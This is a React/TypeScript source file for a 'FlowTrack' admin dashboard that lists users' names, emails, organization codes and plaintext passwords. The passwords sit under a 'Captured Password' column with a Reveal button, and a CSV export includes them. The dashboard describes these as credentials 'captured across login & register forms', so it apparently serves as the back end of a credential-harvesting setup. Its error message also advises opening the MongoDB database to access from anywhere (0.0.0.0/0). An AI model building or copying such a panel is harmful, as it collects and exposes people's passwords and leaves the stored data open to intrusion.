import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  Users, 
  Building2, 
  Search, 
  Trash2, 
  Key, 
  Download, 
  RefreshCw, 
  FileSpreadsheet, 
  ExternalLink,
  ChevronRight,
  UserCheck,
  Lock,
  Mail,
  AlertCircle
} from 'lucide-react';

interface LoggedUser {
  _id: string;
  fullName?: string;
  email: string;
  password?: string;
  accountType?: string;
  orgName?: string;
  orgType?: string;
  orgCode?: string;
  lastLoginAt?: string;
  createdAt?: string;
}

export const AdminPanel: React.FC = () => {
  const [users, setUsers] = useState<LoggedUser[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [roleFilter, setRoleFilter] = useState('all');
  const [errorMessage, setErrorMessage] = useState('');
  const [successMessage, setSuccessMessage] = useState('');
  const [showPass, setShowPass] = useState<Record<string, boolean>>({});

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const res = await fetch('/api/admin/users');
      const json = await res.json();
      if (json.success) {
        setUsers(json.data);
        setErrorMessage('');
      } else {
        setErrorMessage(json.error || json.message || 'Failed to retrieve logs.');
      }
    } catch (err: any) {
      setErrorMessage('Could not connect to the database. Make sure MONGO_URI is set correctly.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  const handleDeleteLog = async (id: string) => {
    if (!window.confirm('Are you sure you want to delete this user log?')) return;
    try {
      const res = await fetch(`/api/admin/users/${id}`, {
        method: 'DELETE',
      });
      const json = await res.json();
      if (json.success) {
        setSuccessMessage('User log deleted successfully!');
        setUsers(users.filter(u => u._id !== id));
        setTimeout(() => setSuccessMessage(''), 3000);
      } else {
        setErrorMessage(json.message || 'Failed to delete user log.');
      }
    } catch (err: any) {
      setErrorMessage('Error connecting to API server.');
    }
  };

  const handleClearAllLogs = async () => {
    if (!window.confirm('WARNING: Are you absolutely sure you want to delete ALL captured user credentials and organization logs? This action is irreversible.')) return;
    try {
      const res = await fetch('/api/admin/users', {
        method: 'DELETE',
      });
      const json = await res.json();
      if (json.success) {
        setSuccessMessage('All database logs cleared successfully!');
        setUsers([]);
        setTimeout(() => setSuccessMessage(''), 3000);
      } else {
        setErrorMessage(json.message || 'Failed to clear database logs.');
      }
    } catch (err: any) {
      setErrorMessage('Error connecting to API server.');
    }
  };

  const togglePasswordVisibility = (id: string) => {
    setShowPass(prev => ({
      ...prev,
      [id]: !prev[id]
    }));
  };

  const exportToCSV = () => {
    if (users.length === 0) return;
    const headers = ['Name', 'Email', 'Password', 'Role', 'Organization Name', 'Org Type', 'Org Code', 'Last Login'];
    const rows = users.map(u => [
      u.fullName || '',
      u.email,
      u.password || '',
      u.accountType || 'Individual',
      u.orgName || '',
      u.orgType || '',
      u.orgCode || '',
      u.lastLoginAt ? new Date(u.lastLoginAt).toLocaleString() : ''
    ]);

    const csvContent = "data:text/csv;charset=utf-8," 
      + [headers.join(','), ...rows.map(e => e.map(val => `"${val.replace(/"/g, '""')}"`).join(","))].join("\n");
    
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `flowtrack_admin_user_logs_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Search & Filter Logic
  const filteredUsers = users.filter(user => {
    const query = searchQuery.toLowerCase().trim();
    const matchSearch = 
      (user.fullName || '').toLowerCase().includes(query) ||
      user.email.toLowerCase().includes(query) ||
      (user.orgName || '').toLowerCase().includes(query) ||
      (user.orgCode || '').toLowerCase().includes(query);

    const matchRole = roleFilter === 'all' || user.accountType === roleFilter;

    return matchSearch && matchRole;
  });

  const totalUsers = users.length;
  const totalOrgs = users.filter(u => u.orgName).length;
  const adminUsers = users.filter(u => u.accountType === 'OrgAdmin').length;

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 font-sans selection:bg-[#3C83F6] selection:text-white pb-12">
      {/* Admin Navbar */}
      <header className="bg-slate-950 border-b border-slate-800/80 sticky top-0 z-40 px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-sky-500 flex items-center justify-center shadow-lg shadow-blue-500/10">
            <ShieldAlert className="w-5.5 h-5.5 text-white" />
          </div>
          <div>
            <h1 className="text-base font-black tracking-tight text-white flex items-center gap-1.5">
              <span>FlowTrack</span>
              <span className="text-[10px] font-mono bg-blue-500/20 text-blue-400 px-1.5 py-0.5 rounded border border-blue-500/30">ADMIN MASTER</span>
            </h1>
            <p className="text-[10px] text-slate-400 font-bold leading-none">Database Credentials & Org Control Panel</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={fetchUsers}
            className="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg border border-slate-700/60 transition-all cursor-pointer flex items-center gap-1 text-xs font-bold"
            title="Refresh database records"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
            <span>Sync</span>
          </button>
          
          <button
            onClick={() => window.location.href = '/'}
            className="py-2 px-3 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-bold transition-all shadow-md shadow-blue-500/15 flex items-center gap-1 cursor-pointer"
          >
            <span>Go to App</span>
            <ExternalLink className="w-3.5 h-3.5" />
          </button>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 pt-8 space-y-6">
        
        {/* Connection info & alerts */}
        {errorMessage && (
          <div className="p-4 bg-red-950/40 border border-red-500/30 rounded-2xl flex items-start gap-3 text-red-300 animate-in fade-in duration-200">
            <AlertCircle className="w-5 h-5 shrink-0 text-red-400 mt-0.5" />
            <div className="text-xs font-bold space-y-1">
              <p>{errorMessage}</p>
              <p className="text-slate-400 font-medium">If this is an IP whitelist error, go to MongoDB Atlas <ChevronRight className="inline w-3 h-3" /> Security <ChevronRight className="inline w-3 h-3" /> Network Access and allow access from anywhere (0.0.0.0/0). Otherwise, verify your <code className="text-slate-200 bg-slate-800 px-1 rounded font-mono">MONGO_URI</code> is correct.</p>
            </div>
          </div>
        )}

        {successMessage && (
          <div className="p-4 bg-emerald-950/40 border border-emerald-500/30 rounded-2xl flex items-center gap-3 text-emerald-300 animate-in fade-in duration-200">
            <UserCheck className="w-5 h-5 shrink-0 text-emerald-400" />
            <span className="text-xs font-bold">{successMessage}</span>
          </div>
        )}

        {/* Master Stats Grid */}
        <section className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="bg-slate-950 border border-slate-800/80 rounded-2xl p-5 relative overflow-hidden group">
            <div className="absolute right-4 top-4 bg-blue-500/10 p-2.5 rounded-xl border border-blue-500/20 text-blue-400">
              <Users className="w-5 h-5" />
            </div>
            <p className="text-[11px] uppercase tracking-wider text-slate-400 font-bold">Total Users Logged</p>
            <h3 className="text-2xl font-black text-white mt-1.5">{totalUsers}</h3>
            <p className="text-[10px] text-slate-500 font-bold mt-1">Captured across login & register forms</p>
          </div>

          <div className="bg-slate-950 border border-slate-800/80 rounded-2xl p-5 relative overflow-hidden group">
            <div className="absolute right-4 top-4 bg-sky-500/10 p-2.5 rounded-xl border border-sky-500/20 text-sky-400">
              <Building2 className="w-5 h-5" />
            </div>
            <p className="text-[11px] uppercase tracking-wider text-slate-400 font-bold">Organizations Created</p>
            <h3 className="text-2xl font-black text-white mt-1.5">{totalOrgs}</h3>
            <p className="text-[10px] text-slate-500 font-bold mt-1">Unique schools and company workspaces</p>
          </div>

          <div className="bg-slate-950 border border-slate-800/80 rounded-2xl p-5 relative overflow-hidden group">
            <div className="absolute right-4 top-4 bg-indigo-500/10 p-2.5 rounded-xl border border-indigo-500/20 text-indigo-400">
              <Key className="w-5 h-5" />
            </div>
            <p className="text-[11px] uppercase tracking-wider text-slate-400 font-bold">Org Administrators</p>
            <h3 className="text-2xl font-black text-white mt-1.5">{adminUsers}</h3>
            <p className="text-[10px] text-slate-500 font-bold mt-1">Users with elevated project admin controls</p>
          </div>
        </section>

        {/* Search & Export Actions Panel */}
        <section className="bg-slate-950 border border-slate-800/80 rounded-2xl p-4 sm:p-5 flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex flex-col sm:flex-row items-center gap-3 w-full sm:w-auto">
            
            {/* Search Input */}
            <div className="relative w-full sm:w-72">
              <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="Search name, email, code..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-9 pr-4 py-2 bg-slate-900 border border-slate-800 rounded-xl text-xs font-bold text-white placeholder:text-slate-500 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
              />
            </div>

            {/* Filter */}
            <div className="flex items-center gap-1.5 w-full sm:w-auto">
              <span className="text-[11px] font-bold text-slate-400 shrink-0 hidden sm:inline">Role:</span>
              <select
                value={roleFilter}
                onChange={(e) => setRoleFilter(e.target.value)}
                className="w-full sm:w-auto py-2 px-3 bg-slate-900 border border-slate-800 rounded-xl text-xs font-bold text-white focus:outline-none focus:border-blue-500 cursor-pointer"
              >
                <option value="all">All Roles</option>
                <option value="OrgAdmin">Organization Admin</option>
                <option value="TeamMember">Team Member</option>
                <option value="Individual">Individual User</option>
              </select>
            </div>

          </div>

          <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
            <button
              onClick={exportToCSV}
              disabled={filteredUsers.length === 0}
              className="w-full sm:w-auto py-2 px-3 bg-slate-800 hover:bg-slate-750 disabled:opacity-50 text-slate-200 rounded-xl text-xs font-bold border border-slate-700/50 flex items-center justify-center gap-1.5 cursor-pointer transition-all"
            >
              <FileSpreadsheet className="w-3.5 h-3.5 text-emerald-400" />
              <span>Export CSV</span>
            </button>

            <button
              onClick={handleClearAllLogs}
              disabled={users.length === 0}
              className="w-full sm:w-auto py-2 px-3 bg-red-950/40 hover:bg-red-900/40 text-red-400 disabled:opacity-50 rounded-xl text-xs font-bold border border-red-500/20 flex items-center justify-center gap-1.5 cursor-pointer transition-all"
            >
              <Trash2 className="w-3.5 h-3.5 text-red-400" />
              <span>Clear Database Logs</span>
            </button>
          </div>
        </section>

        {/* Database Grid Table */}
        <section className="bg-slate-950 border border-slate-800/80 rounded-2xl overflow-hidden shadow-xl">
          <div className="overflow-x-auto">
            {loading ? (
              <div className="py-20 text-center space-y-3">
                <RefreshCw className="w-8 h-8 text-blue-500 animate-spin mx-auto" />
                <p className="text-xs text-slate-400 font-bold">Querying MongoDB Atlas database clusters...</p>
              </div>
            ) : filteredUsers.length === 0 ? (
              <div className="py-16 text-center space-y-2">
                <Users className="w-10 h-10 text-slate-700 mx-auto" />
                <h4 className="text-sm font-black text-slate-300">No User Credentials Logged</h4>
                <p className="text-xs text-slate-500 font-medium max-w-sm mx-auto">
                  When a user logs in or registers on the homepage, their login/registration details are stored directly into MongoDB Atlas.
                </p>
              </div>
            ) : (
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b border-slate-800 bg-slate-900/60 text-[10px] text-slate-400 uppercase font-black tracking-wider">
                    <th className="py-4 px-5">User Info</th>
                    <th className="py-4 px-5">Captured Password</th>
                    <th className="py-4 px-5">Account Status / Role</th>
                    <th className="py-4 px-5">Organization details</th>
                    <th className="py-4 px-5">Last Activity</th>
                    <th className="py-4 px-5 text-right">Delete</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60">
                  {filteredUsers.map((user) => {
                    const id = user._id;
                    const isPassVisible = !!showPass[id];

                    return (
                      <tr key={id} className="hover:bg-slate-900/40 transition-colors">
                        
                        {/* User profile */}
                        <td className="py-4 px-5">
                          <div className="flex items-center gap-3">
                            <div className="w-9 h-9 rounded-full bg-slate-800 flex items-center justify-center text-xs font-black text-blue-400 border border-slate-700/60">
                              {user.fullName ? user.fullName.charAt(0).toUpperCase() : 'U'}
                            </div>
                            <div>
                              <div className="text-xs font-black text-white">{user.fullName || 'No Name Provided'}</div>
                              <div className="text-[10px] text-slate-400 font-bold flex items-center gap-1 mt-0.5">
                                <Mail className="w-3 h-3 text-slate-500" />
                                <span>{user.email}</span>
                              </div>
                            </div>
                          </div>
                        </td>

                        {/* Password */}
                        <td className="py-4 px-5">
                          <div className="flex items-center gap-2">
                            <Lock className="w-3 h-3 text-amber-500 shrink-0" />
                            <code className="text-xs font-mono bg-slate-900/80 border border-slate-800/80 px-2 py-1 rounded text-amber-300">
                              {isPassVisible ? user.password : '••••••••••••'}
                            </code>
                            <button
                              onClick={() => togglePasswordVisibility(id)}
                              className="text-[10px] font-black text-blue-400 hover:text-blue-300 ml-1 cursor-pointer hover:underline"
                            >
                              {isPassVisible ? 'Hide' : 'Reveal'}
                            </button>
                          </div>
                        </td>

                        {/* Role Status badge */}
                        <td className="py-4 px-5">
                          <span className={`inline-flex items-center px-2 py-0.5 rounded-full text-[10px] font-black tracking-wide border uppercase ${
                            user.accountType === 'OrgAdmin' 
                              ? 'bg-blue-500/10 text-blue-400 border-blue-500/20'
                              : user.accountType === 'TeamMember'
                              ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
                              : 'bg-slate-500/10 text-slate-400 border-slate-500/20'
                          }`}>
                            {user.accountType === 'OrgAdmin' ? 'Org Admin' : user.accountType === 'TeamMember' ? 'Team Member' : 'Individual'}
                          </span>
                        </td>

                        {/* Organization */}
                        <td className="py-4 px-5">
                          {user.orgName ? (
                            <div className="space-y-0.5">
                              <div className="text-xs font-bold text-slate-200 flex items-center gap-1">
                                <Building2 className="w-3 h-3 text-slate-400" />
                                <span>{user.orgName}</span>
                              </div>
                              <div className="text-[10px] text-slate-500 font-bold">
                                Code: <span className="font-mono text-slate-300 font-black">{user.orgCode || 'None'}</span>
                                {user.orgType && ` | ${user.orgType}`}
                              </div>
                            </div>
                          ) : (
                            <span className="text-xs text-slate-600 font-medium italic">No org workspace linked</span>
                          )}
                        </td>

                        {/* Date info */}
                        <td className="py-4 px-5">
                          <div className="text-xs text-slate-300 font-bold">
                            {user.lastLoginAt ? new Date(user.lastLoginAt).toLocaleString() : 'N/A'}
                          </div>
                          <div className="text-[9px] text-slate-500 font-bold mt-0.5">
                            Created: {user.createdAt ? new Date(user.createdAt).toLocaleDateString() : 'N/A'}
                          </div>
                        </td>

                        {/* Delete button */}
                        <td className="py-4 px-5 text-right">
                          <button
                            onClick={() => handleDeleteLog(id)}
                            className="p-1.5 text-slate-500 hover:text-red-400 bg-transparent hover:bg-red-500/10 rounded-lg transition-all cursor-pointer"
                            title="Remove log"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>

                      </tr>
                    );
                  })}
                </tbody>
              </table>
            )}
          </div>

          <div className="bg-slate-900/40 px-5 py-3 border-t border-slate-800 text-right text-[11px] text-slate-500 font-bold">
            Showing {filteredUsers.length} of {users.length} captured credentials.
          </div>
        </section>

      </main>
    </div>
  );
};
export default AdminPanel;
